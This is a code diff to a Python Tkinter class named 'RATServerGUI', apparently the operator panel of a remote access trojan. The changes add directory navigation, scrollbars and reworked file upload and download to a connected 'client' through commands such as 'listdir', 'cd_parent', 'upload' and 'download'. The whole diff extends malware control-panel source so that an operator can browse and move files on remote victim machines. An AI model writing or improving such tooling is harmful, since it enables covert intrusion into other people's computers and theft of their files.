@@ -530,9 +530,18 @@ class RATServerGUI:
         lf = tk.Frame(left, bg=self.bg_card)
         lf.pack(fill="both", expand=True, padx=8, pady=3)
         self.local_files = tk.Listbox(lf, bg=self.bg_input, fg=self.text_color, font=("Consolas", 9),
-                                       borderwidth=0, highlightthickness=0, selectbackground=self.accent_color)
+                                       borderwidth=0, highlightthickness=0, selectbackground=self.accent_color,
+                                       selectforeground=self.bg_main)
+        lsb = tk.Scrollbar(lf, orient="vertical", command=self.local_files.yview,
+                            bg=self.bg_sidebar, troughcolor=self.bg_main)
+        lsb.pack(side="right", fill="y")
+        self.local_files.config(yscrollcommand=lsb.set)
         self.local_files.pack(side="left", fill="both", expand=True)
-        ttk.Button(left, text="Actualiser", command=self.refresh_local_files).pack(anchor="w", padx=8, pady=4)
+        self.local_files.bind("<Double-Button-1>", self._local_navigate)
+        btn_local = tk.Frame(left, bg=self.bg_card)
+        btn_local.pack(fill="x", padx=8, pady=4)
+        ttk.Button(btn_local, text="↑ Parent", command=self._local_go_up).pack(side="left", padx=(0, 4))
+        ttk.Button(btn_local, text="Actualiser", command=self.refresh_local_files).pack(side="left")
 
         mid = tk.Frame(panel, bg=self.bg_main, width=90)
         mid.pack(side="left", fill="y", padx=4)
@@ -553,9 +562,18 @@ class RATServerGUI:
         rf = tk.Frame(right, bg=self.bg_card)
         rf.pack(fill="both", expand=True, padx=8, pady=3)
         self.remote_files = tk.Listbox(rf, bg=self.bg_input, fg=self.text_color, font=("Consolas", 9),
-                                        borderwidth=0, highlightthickness=0, selectbackground=self.accent_color)
+                                        borderwidth=0, highlightthickness=0, selectbackground=self.accent_color,
+                                        selectforeground=self.bg_main)
+        rsb = tk.Scrollbar(rf, orient="vertical", command=self.remote_files.yview,
+                            bg=self.bg_sidebar, troughcolor=self.bg_main)
+        rsb.pack(side="right", fill="y")
+        self.remote_files.config(yscrollcommand=rsb.set)
         self.remote_files.pack(side="left", fill="both", expand=True)
-        ttk.Button(right, text="Actualiser", command=self.list_remote_files).pack(anchor="w", padx=8, pady=4)
+        self.remote_files.bind("<Double-Button-1>", self._remote_navigate)
+        btn_remote = tk.Frame(right, bg=self.bg_card)
+        btn_remote.pack(fill="x", padx=8, pady=4)
+        ttk.Button(btn_remote, text="↑ Parent", command=self._remote_go_up).pack(side="left", padx=(0, 4))
+        ttk.Button(btn_remote, text="Actualiser", command=self.list_remote_files).pack(side="left")
 
         self.refresh_local_files()
 
@@ -1887,23 +1905,54 @@ DÉMARRAGE RAPIDE:
 
     def browse_local_dir(self):
         d = filedialog.askdirectory(initialdir=self.local_path_var.get())
-        if d: self.local_path_var.set(d); self.refresh_local_files()
+        if d:
+            self.local_path_var.set(d)
+            self.refresh_local_files()
 
     def refresh_local_files(self):
         self.local_files.delete(0, tk.END)
         path = self.local_path_var.get()
-        if not os.path.isdir(path): return
+        if not os.path.isdir(path):
+            return
         try:
-            for item in sorted(os.listdir(path)):
+            items = sorted(os.listdir(path), key=lambda x: (not os.path.isdir(os.path.join(path, x)), x.lower()))
+            for item in items:
                 full = os.path.join(path, item)
                 if os.path.isdir(full):
-                    self.local_files.insert(tk.END, f"[DIR] {item}")
+                    self.local_files.insert(tk.END, f"[DIR]  {item}")
                 else:
-                    self.local_files.insert(tk.END, f"{item}")
-        except: pass
+                    try:
+                        size = os.path.getsize(full)
+                        size_str = f"{size:,}" if size < 1024*1024 else f"{size/1024/1024:.1f} MB"
+                    except OSError:
+                        size_str = "?"
+                    self.local_files.insert(tk.END, f"       {item}  ({size_str})")
+        except Exception:
+            pass
+
+    def _local_navigate(self, event=None):
+        sel = self.local_files.curselection()
+        if not sel:
+            return
+        text = self.local_files.get(sel[0]).strip()
+        if not text.startswith("[DIR]"):
+            return
+        name = text[5:].strip()
+        new_path = os.path.join(self.local_path_var.get(), name)
+        if os.path.isdir(new_path):
+            self.local_path_var.set(os.path.normpath(new_path))
+            self.refresh_local_files()
+
+    def _local_go_up(self):
+        current = self.local_path_var.get()
+        parent = os.path.dirname(current)
+        if parent and parent != current:
+            self.local_path_var.set(parent)
+            self.refresh_local_files()
 
     def list_remote_files(self):
-        if not self.current_client_id: self.log_message("No client", "error"); return
+        if not self.current_client_id:
+            self.log_message("No client", "error"); return
         path = self.remote_path_var.get() or "."
         def do():
             resp = self._send_recv(f"listdir {path}")
@@ -1913,25 +1962,75 @@ DÉMARRAGE RAPIDE:
 
     def _fill_remote_list(self, data):
         self.remote_files.delete(0, tk.END)
+        dirs = []
+        files = []
         for line in data.strip().split("\n"):
-            if line.strip(): self.remote_files.insert(tk.END, line.strip())
+            line = line.strip()
+            if not line:
+                continue
+            if line.startswith("[DIR]"):
+                dirs.append(line)
+            else:
+                files.append(line)
+        for entry in dirs + files:
+            self.remote_files.insert(tk.END, entry)
+
+    def _remote_navigate(self, event=None):
+        sel = self.remote_files.curselection()
+        if not sel:
+            return
+        text = self.remote_files.get(sel[0]).strip()
+        if not text.startswith("[DIR]"):
+            return
+        name = text[5:].strip()
+        current = self.remote_path_var.get().rstrip("/").rstrip("\\")
+        # Build new path — let the client OS resolve it
+        sep = "\\" if "\\" in current or (len(current) >= 2 and current[1] == ":") else "/"
+        new_path = current + sep + name if current not in (".", "") else name
+        self.remote_path_var.set(new_path)
+        self.list_remote_files()
+
+    def _remote_go_up(self):
+        if not self.current_client_id:
+            self.log_message("No client", "error"); return
+        current = self.remote_path_var.get()
+        def do():
+            # Ask client for the parent of the current path
+            resp = self._send_recv(f"cd_parent {current}")
+            if resp and not resp.startswith("[!]"):
+                self.root.after(0, lambda: (
+                    self.remote_path_var.set(resp.strip()),
+                    self.list_remote_files()
+                ))
+            else:
+                # Fallback: strip last component locally
+                for sep in ("\\", "/"):
+                    if sep in current:
+                        parent = current.rsplit(sep, 1)[0] or sep
+                        self.root.after(0, lambda p=parent: (
+                            self.remote_path_var.set(p),
+                            self.list_remote_files()
+                        ))
+                        return
+        threading.Thread(target=do, daemon=True).start()
 
     def upload_file(self):
         if not self.current_client_id: self.log_message("No client", "error"); return
         sel = self.local_files.curselection()
         if not sel: self.log_message("Select a file", "warning"); return
-        text = self.local_files.get(sel[0])
-        if text.startswith("[DIR]"): self.log_message("Select a file", "warning"); return
-        filepath = os.path.join(self.local_path_var.get(), text)
+        text = self.local_files.get(sel[0]).strip()
+        if text.startswith("[DIR]"): self.log_message("Sélectionne un fichier, pas un dossier", "warning"); return
+        name = text.lstrip().split("  ")[0].strip()
+        filepath = os.path.join(self.local_path_var.get(), name)
         threading.Thread(target=self._do_upload, args=(f"upload {filepath}",), daemon=True).start()
 
     def download_file(self):
         if not self.current_client_id: self.log_message("No client", "error"); return
         sel = self.remote_files.curselection()
         if not sel: self.log_message("Select a file", "warning"); return
-        text = self.remote_files.get(sel[0])
-        if text.startswith("[DIR]"): self.log_message("Select a file", "warning"); return
-        name = text.split(" (")[0] if " (" in text else text
+        text = self.remote_files.get(sel[0]).strip()
+        if text.startswith("[DIR]"): self.log_message("Sélectionne un fichier, pas un dossier", "warning"); return
+        name = text.split(" (")[0].strip() if " (" in text else text.strip()
         threading.Thread(target=self._do_download, args=(f"download {name}",), daemon=True).start()
 
     def _do_upload(self, cmd):
